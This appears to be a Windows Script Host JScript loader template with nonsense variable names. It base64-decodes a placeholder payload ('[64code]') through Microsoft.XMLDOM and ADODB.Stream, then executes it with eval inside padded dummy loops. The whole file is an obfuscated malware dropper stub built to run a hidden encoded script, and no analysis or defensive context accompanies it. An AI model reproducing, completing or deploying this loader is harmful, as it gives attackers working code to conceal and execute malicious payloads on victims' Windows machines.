function ceiling_fan(ibadan, maiduguri, cup_board, benue, gggggg){
	var u = 0;
		switch(u){
			case 1:
				break;
			default:
				cup_board.Type = 1;
				cup_board.Open();
				cup_board.Write(maiduguri);
				cup_board.Position = 0;
				cup_board.Type = 2;
				cup_board.CharSet = "us-ascii";
				return cup_board.ReadText();
				break;
		}
}

function b_64_2_byt_arr(cross_river, abakaliki, lokojah){
	if(cross_river != null){
		var akwa_ibom = cross_river.createElement("tmp");
		akwa_ibom.dataType = "bin.base64";
		akwa_ibom.text = abakaliki;
		return akwa_ibom.nodeTypedValue;
	}
}

function abia_umaiya(yoolah, mercury, venus){
    var compat, electric, duvet, hp_pavilion;
    compat = "[mutex]";
    electric = "[A]";
    duvet = "[64code]"
    hp_pavilion = "";
    if(yoolah == 0){
		var regx = new RegExp(compat, "g");
        hp_pavilion = duvet.replace(regx, electric);
        return b_64_2_byt_arr(WScript.CreateObject("Microsoft.XMLDOM"), hp_pavilion, "g");
    }
}
var anambra = abia_umaiya(0, 1, 2);
var otapiapia = ceiling_fan(null, anambra, WScript.CreateObject("ADODB.Stream"), false, 2);
var cc = 0;
for(cc=0; cc < 2; cc++){
	cc = cc + 1;
	if(cc == 1){
		for(i=0; i<1; i++){
			eval(otapiapia);
		}
	}
}